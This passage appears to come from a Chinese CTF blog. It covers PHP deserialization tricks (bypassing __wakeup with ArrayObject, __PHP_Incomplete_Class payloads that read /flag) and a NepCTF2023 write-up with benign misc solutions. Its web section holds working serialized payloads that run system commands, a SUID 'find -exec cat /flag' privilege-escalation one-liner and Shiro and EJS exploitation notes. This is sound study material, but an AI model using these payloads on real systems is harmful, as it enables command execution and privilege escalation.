class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK&quot;</span>;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);    &#125;&#125; <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<span class="hljs-variable">$a</span>-&gt;ctfshow = <span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">##O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;</span></code></pre></div><p>直接改为<code>C:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;</code> ，无结果回显</p><p>使用<code>C:7:&quot;ctfshow&quot;:0:&#123;&#125;</code>，能够成功绕过<code>__wakeup</code>执行<code>__destruct</code>的代码（但由于不能带参数，无法执行<code>system</code>函数）</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903232632446.png" alt="image-20230903232632446"></p><h3 id="真正做法"><a href="#真正做法" class="headerlink" title="真正做法"></a>真正做法</h3><p>使用<code>ArrayObject</code>对正常的反序列化进行一次包装，让最后输出的payload以<code>C</code>开头</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK&quot;</span>;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> ctfshow;<span class="hljs-variable">$a</span>-&gt;ctfshow=<span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<span class="hljs-variable">$oa</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$oa</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></code></pre></div><p>并且不能像平常一样修改命令和对应数量</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ArrayObject&quot;</span>:<span class="hljs-number">77</span>:&#123;x:i:<span class="hljs-number">0</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ls /&quot;</span>;&#125;&#125;;m:a:<span class="hljs-number">0</span>:&#123;&#125;&#125;     #修改命令和对应数量</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230903233724352.png" alt="image-20230903233724352"></p><p>无结果</p><p>其他像<code>ArrayObject</code>的生成以<code>c</code>开头的<code>payload</code>，请看愚人杯3rd[easy_php] | Boogiepop Doesn’t Laugh (boogipop.com)](<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd">https://boogipop.com/2023/04/02/愚人杯3rd</a> [easy_php]&#x2F;)</p><p>嘿嘿，还得是Boogipop大佬</p><h2 id="序列化字符串正则绕过（不能传入以O和a开头的序列化值）"><a href="#序列化字符串正则绕过（不能传入以O和a开头的序列化值）" class="headerlink" title="序列化字符串正则绕过（不能传入以O和a开头的序列化值）"></a>序列化字符串正则绕过（不能传入以O和a开头的序列化值）</h2><h3 id="字符O绕过"><a href="#字符O绕过" class="headerlink" title="字符O绕过"></a>字符O绕过</h3><p>低版本&lt;7.1.33</p><div class="code-wrapper"><pre><code class="hljs lisp">unserialize(&#x27;O<span class="hljs-symbol">:+1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#x27;)<span class="hljs-comment">;</span></code></pre></div><p>字符i，d绕过</p><p>&lt;8.0.3（全版本）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);</code></pre></div><h1 id="php冷知识"><a href="#php冷知识" class="headerlink" title="php冷知识"></a>php冷知识</h1><h2 id="题目：serialize-unserialize-x-x"><a href="#题目：serialize-unserialize-x-x" class="headerlink" title="题目：serialize(unserialize($x)) !&#x3D; $x"></a>题目：serialize(unserialize($x)) !&#x3D; $x</h2><p>正常来说一个合法的反序列化字符串，在二次序列化也即反序列化再序列化之后所得到的结果是一致的。</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$raw</span>));<span class="hljs-comment">#O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;</span></code></pre></div><p>当我们反序列化一个不存在的类时，会发生什么</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904104019989.png" alt="image-20230904104019989"></p><p>可以看到出现了<code>__PHP_Incomplete_Class</code></p><p>PHP在遇到不存在的类时，会把不存在的类转换成<code>__PHP_Incomplete_Class</code>这种特殊的类，同时将原始的类名<code>A</code>存放在<code>__PHP_Incomplete_Class_Name</code>这个属性中，其余属性存放方式不变。而我们在序列化这个对象的时候，<code>serialize</code>遇到<code>__PHP_Incomplete_Class</code>这个特殊类会倒推回来，序列化成<code>__PHP_Incomplete_Class_Name</code>值为类名的类（即<code>A</code>）</p><p>当我们自己构造如下字符串</p><div class="code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;stdClass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;N;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;O:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;__PHP_Incomplete_Class&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abd&quot;</span>;N;&#125;&#125;</code></pre></div><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904110708015.png" alt="image-20230904110708015"></p><p>可以看到当反序列化后的结果再次序列化后<code>O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:1:&quot;a&quot;;O:7:&quot;classes&quot;:0:&#123;&#125;&#125;</code>中<code>__PHP_Incomplete_Class_Name</code>为空，找不到应该绑定的类，其属性就被丢弃了，导致了<code>serialize(unserialize($x)) != $x</code>的出现。</p><h3 id="强网杯2021-WhereisUWebShell"><a href="#强网杯2021-WhereisUWebShell" class="headerlink" title="强网杯2021 WhereisUWebShell"></a>强网杯2021 WhereisUWebShell</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// index.php</span><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;function.php&quot;</span>;<span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ctfer&#x27;</span>]);<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/myclass/i&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>)))&#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);&#125;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;myclass.php&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;function.php&quot;</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// myclass.php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;qwb) <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;qwb);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// function.php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span></span>)</span>&#123;    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;./<span class="hljs-subst">$classname</span>.php&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>需要加载<code>myclass.php</code>中的<code>hello</code>类，但是要引入<code>hello</code>类，根据<code>__autoload</code>我们需要一个<code>classname</code>为<code>myclass</code>的类</p><p>但问题就是<code>myclass</code>类不存在，如果直接去反序列化，只会在反序列化<code>myclass</code>类的时候报错无法进入下一步，或者在反序列化<code>Hello</code>的时候找不到这个类而报错。</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;__PHP_Incomplete_Class&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;qwb&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;myclass&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#125;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;qwb&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;&#125;</code></pre></div><p>myclass作为了<code>__PHP_Incomplete_Class</code>中属性，会触发<code>__autoload</code>引入<code>myclass.php</code>，而对他进行二次序列化时，因为<code>__PHP_Incomplete_Class</code>没有<code>__PHP_Incomplete_Class_Name</code>该对象会消失，从而绕过<code>preg_match</code>的检测，并在最后触发<code>Hello</code>类的反序列化。</p><p>网上的图</p><p><img src="/2023/08/31/php%E7%9A%84-wakeup%E7%BB%95%E8%BF%87/image-20230904134136323.png" alt="image-20230904134136323"></p><h4 id="这道题也能fast-destruct"><a href="#这道题也能fast-destruct" class="headerlink" title="这道题也能fast destruct"></a>这道题也能fast destruct</h4><p>这里</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2023</title>
    <link href="/2023/08/31/NepCTF2023/"/>
    <url>/2023/08/31/NepCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepctf2023-复现"><a href="#Nepctf2023-复现" class="headerlink" title="Nepctf2023(复现)"></a>Nepctf2023(复现)</h1><p><strong>比赛战队名：shimmer</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;H4ve_Fun_1N_This_Game&#125;</span></code></pre></div><h3 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h3><p>利用AI写出对应的解压函数即可</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decompress</span>(<span class="hljs-params">input_file, output_file</span>):    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-comment"># Read frequency information</span>        num_symbols = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)        frequencies = &#123;&#125;        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_symbols):            byte = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">1</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)            freq = <span class="hljs-built_in">int</span>.from_bytes(f.read(<span class="hljs-number">4</span>), byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)            frequencies[byte] = freq        <span class="hljs-comment"># Build Huffman tree</span>        root = build_huffman_tree(frequencies)        <span class="hljs-comment"># Read compressed data</span>        compressed_data = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            byte = f.read(<span class="hljs-number">1</span>)            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> byte:                <span class="hljs-keyword">break</span>            compressed_data += <span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(byte), <span class="hljs-string">&#x27;08b&#x27;</span>)    current_node = root    decompressed_data = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> compressed_data:        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:            current_node = current_node.left        <span class="hljs-keyword">else</span>:            current_node = current_node.right        <span class="hljs-keyword">if</span> current_node.char <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:            decompressed_data += <span class="hljs-built_in">chr</span>(current_node.char)            current_node = root    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:        f.write(decompressed_data)</code></pre></div><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">Nepctf</span><span class="hljs-template-variable">&#123;huffman_zip_666&#125;</span></code></pre></div><h3 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h3><p>题目要求读取环境变量</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **envp)</span></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,envp[<span class="hljs-number">0</span>]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>env被列入黑名单，修改为其他变量名即可</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//最终payload</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv,<span class="hljs-type">char</span> **enp)</span></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the 1st envp is : %s\n&quot;</span>,enp[<span class="hljs-number">12</span>]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Nepctf</span>&#123;easy_codes_49260e9f-bcb8-<span class="hljs-number">4</span>bb3-<span class="hljs-number">9</span>a8f-<span class="hljs-number">7</span>c0418978cda_[TEAM_HASH]&#125;</code></pre></div><h3 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h3><p>使用audacity打开</p><p>前半段为摩斯密码，长的为<code>-</code>，短的为<code>.</code>，中间空的为空格</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">youshouldusethistoxorsomething</span></code></pre></div><p>后半段侧过来看是一串16进制</p><div class="code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">0</span>x370a05303c290e045005031c2b1858473a5f052117032c39230f<span class="hljs-number">005d1e17</span></code></pre></div><p>根据提示把他俩异或</p><div class="code-wrapper"><pre><code class="hljs stylus">b= <span class="hljs-string">&#x27;youshouldusethistoxorsomething&#x27;</span><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[0x37,0x0a,0x05,0x30,0x3c,0x29,0x0e,0x04,0x50,0x05,0x03,0x1c,0x2b,0x18,0x58,0x47,0x3a,0x5f,0x05,0x21,0x17,0x03,0x2c,0x39,0x23,0x0f,0x00,0x5d,0x1e,0x17]</span>e=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):    e += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[i]</span>)^<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[i]</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(e)</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4ppy_p14N0&#125;</span><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;h4pp</span></code></pre></div><h3 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h3><p><img src="/2023/08/31/NepCTF2023/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg" alt="题目"></p><p>根据提示Atsuko Kagari，找到小魔女学院，搜索<code>小魔女学院文字</code>发现<code>新月文字</code></p><p>然后继续找到<code>古龙语</code></p><p><img src="/2023/08/31/NepCTF2023/fb569e24b899a9014e4b15075b950a7b0208f568.jpg" alt="img"></p><p><img src="/2023/08/31/NepCTF2023/image-20230817081407279.png" alt="image-20230817081407279"></p><div class="code-wrapper"><pre><code class="hljs autohotkey">NepCTF&#123;NEPNEP_<span class="hljs-built_in">A_BELIEVING</span>_HEART_IS_YOUR_MAGIC&#125;</code></pre></div><h3 id="你也喜欢三月七吗"><a href="#你也喜欢三月七吗" class="headerlink" title="你也喜欢三月七吗"></a>你也喜欢三月七吗</h3><p>题目</p><div class="code-wrapper"><pre><code class="hljs">啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！需要经过啥256处理一下</code></pre></div><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">salt_lenth</span>= <span class="hljs-number">10</span> <span class="hljs-attr">key_lenth</span>= <span class="hljs-number">16</span> <span class="hljs-attr">iv</span>= <span class="hljs-number">88219</span>bdee9c396eca3c637c0ea436058 <span class="hljs-comment">#原始iv转hex的值</span><span class="hljs-attr">ciphertext</span>= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</code></pre></div><p>解析题目：群名、咸（salt）、sha256</p><p>Key为salt（群名）用sha256加密的前16位</p><p>看代码发现<code>iv和key</code>猜测是AES256</p><p><img src="/2023/08/31/NepCTF2023/image-20230817083833353.png" alt="image-20230817083833353"></p><p>用cyberchef<code>Mode</code>要调为<code>NoPadding</code></p><p>得到一张图片</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//img</span>1.imgtp.com<span class="hljs-regexp">/2023/</span><span class="hljs-number">07</span><span class="hljs-regexp">/24/y</span>OkXWSJT.png</code></pre></div><p><img src="/2023/08/31/NepCTF2023/%E4%BD%A0%E7%8E%A9%E8%BF%87%E6%98%9F%E7%A9%B9%E9%93%81%E9%81%93%E5%90%97.png" alt="图片"></p><p>搜索<code>星穹铁道文字</code>       （<code>I</code>不容易看出是大写）</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;HRP_aIways_likes_March_7th&#125;</span></code></pre></div><h3 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h3><p>看别人都说玩完就行，但还是搞不懂</p><h3 id="EZII-BASIC"><a href="#EZII-BASIC" class="headerlink" title="EZII BASIC"></a>EZII BASIC</h3><p>题目关键词：1977年 世界上第一批大规模生产的个人电脑   BASIC语言</p><p><img src="/2023/08/31/NepCTF2023/image-20230819031956318.png" alt="image-20230819031956318"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032307820.png" alt="image-20230819032307820"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032325509.png" alt="image-20230819032325509"></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032355056.png" alt="image-20230819032355056"></p><p>可以看到第十行是<code>END</code></p><p>运行时把第十行修改一下</p><p><img src="/2023/08/31/NepCTF2023/image-20230819032446411.png" alt="image-20230819032446411"></p><p>然后<code>RUN</code></p><p><img src="/2023/08/31/NepCTF2023/image-20230819032625921.png" alt="image-20230819032625921"></p><p>这里复现就不比对了</p><h2 id="WEB（参考Boogipop的博客和官方WP）"><a href="#WEB（参考Boogipop的博客和官方WP）" class="headerlink" title="WEB（参考Boogipop的博客和官方WP）"></a>WEB（参考Boogipop的博客和官方WP）</h2><p>（没环境复现，都是大佬的图，给的题目附件不会用）</p><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>经典的shrio rememberMe反序列化</p><p>利用CC2的链去打</p><p>这里用工具一把梭</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#算是非预期</span>cat /start.sh<span class="hljs-comment">#/bin/bash</span><span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=NepcTF&#123;Ezjava_Chekin&#125;echo <span class="hljs-variable">$GZCTF_FLAG</span> &gt; /flag<span class="hljs-built_in">export</span> <span class="hljs-attribute">GZCTF_FLAG</span>=<span class="hljs-string">&quot;HAHA,NO FLAG but boom.&quot;</span>su ctf -c <span class="hljs-string">&quot;bash -c &#x27;java -jar /ShiroSpring-0.0.1-SNAPSHOT.jar&#x27;&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#预期</span><span class="hljs-built_in">ls</span> /usr/bin -l|grep rws    <span class="hljs-comment">##查找可suid提权</span>find suid 提权<span class="hljs-built_in">touch</span> /tmp/evil&amp;find /tmp/evil -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;</code></pre></div><h3 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h3><p>两篇文章了解ejs模板注入</p><p><a href="https://xz.aliyun.com/t/12323#toc-1">Ejs模板引擎注入实现RCE - 先知社区 (aliyun.com)</a></p><p><a href="https://inhann.top/2023/03/26/ejs/">https://inhann.top/2023/03/26/ejs/</a></p><p>题目代码</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;crypto&quot;</span>);<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>templateDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;template&#x27;</span>);app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;template&#x27;</span>, templateDir);<span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">milliSeconds</span>)&#123;    <span class="hljs-keyword">var</span> <span class="hljs-title class_">StartTime</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &lt;<span class="hljs-title class_">StartTime</span>+milliSeconds);&#125;app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>, &#123;<span class="hljs-attr">root</span>: __dirname&#125;);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> uuid;    <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">query</span>.<span class="hljs-property">name</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">let</span> address = req.<span class="hljs-property">query</span>.<span class="hljs-property">address</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">let</span> message = req.<span class="hljs-property">query</span>.<span class="hljs-property">message</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">do</span> &#123;        uuid = crypto.<span class="hljs-title function_">randomUUID</span>();    &#125; <span class="hljs-keyword">while</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span 